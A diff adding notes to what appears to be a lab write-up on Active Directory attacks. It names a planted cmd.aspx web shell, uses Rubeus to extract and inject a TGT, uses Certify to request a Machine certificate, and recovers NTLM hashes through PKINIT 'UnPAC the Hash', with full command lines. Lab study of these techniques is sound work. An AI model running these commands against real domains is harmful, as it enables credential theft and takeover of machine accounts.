@@ -70,3 +70,42 @@ TgtDeleg:
   Extract your TGT session key from inside
   Rebuild a full TGT using these components
 ```
+
+- So we dump rubeus on the machine via cmd.aspx shell and run rubeus.exe tgtdeleg /nowrap -> Gives us the base64 TGT for cb-webapp1 > Copy this and inject this on the studentvm - compromised machine
+- Command to inject the ticket : rubeus.exe ptt /ticket:<b64_TGT> -> Then do klist to view the injected TGT
+- Now using the TGT we can issue a certificate using the machine template
+        - Command : certify.exe request /ca:cb-ca.cb.corp\CB-CA /user:cb-webapp1$ /domain:certbulk.cb.corp /template:Machine
+        - Save the cert as cb-webapp1.pem
+        - Convert from pem to pfx using openssl
+        - Command : openssl.exe pkcs12 -in 'cb-webapp1.pem' -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cb-webapp1.pfx
+        - Provide the password : any random password
+
+-  UnPAC the Hash :
+```
+Step 1: You Have a Certificate
+- You possess cb-webapp1.pfx (certificate + private key)
+- This gives you PKINIT authentication capability for cb-webapp1
+
+Step 2: Request TGT via PKINIT
+- Command : rubeus.exe asktgt /getcredentials /user:cb-webapp1 /certificate:cb-webapp1.pfx /password:password /domain:certbulk.cb.corp /dc:cb-dc.certbulk.cb.corp /show
+
+Step 3: The PAC_CREDENTIAL_INFO Structure
+TGT contains:
+<img width="663" height="539" alt="image" src="https://github.com/user-attachments/assets/7f530878-7f1a-4e6f-8e61-9af0f259a0a7" />
+
+
+Step 4: User-to-User (U2U) Authentication Trick
+Here's the clever part. Instead of trying to directly decrypt the PAC, you:
+Request a service ticket TO YOURSELF: # Ask for service ticket for cb-webapp1 to cb-webapp1. TGS-REQ: "Give me ticket for cb-webapp1@domain TO cb-webapp1@domain"
+
+Why U2U?
+- In U2U, the service ticket is encrypted with your session key (which you have)
+- This means you can decrypt the service ticket
+- The decrypted service ticket contains the same PAC_CREDENTIAL_INFO with NTLM hashes
+
+Step 5: Extract NTLM Hashes
+- Since you can decrypt the U2U service ticket (it's encrypted with your key), you can:
+- Extract the PAC_CREDENTIAL_INFO structure
+- Recover the NTLM hashes from inside it
+```
+           
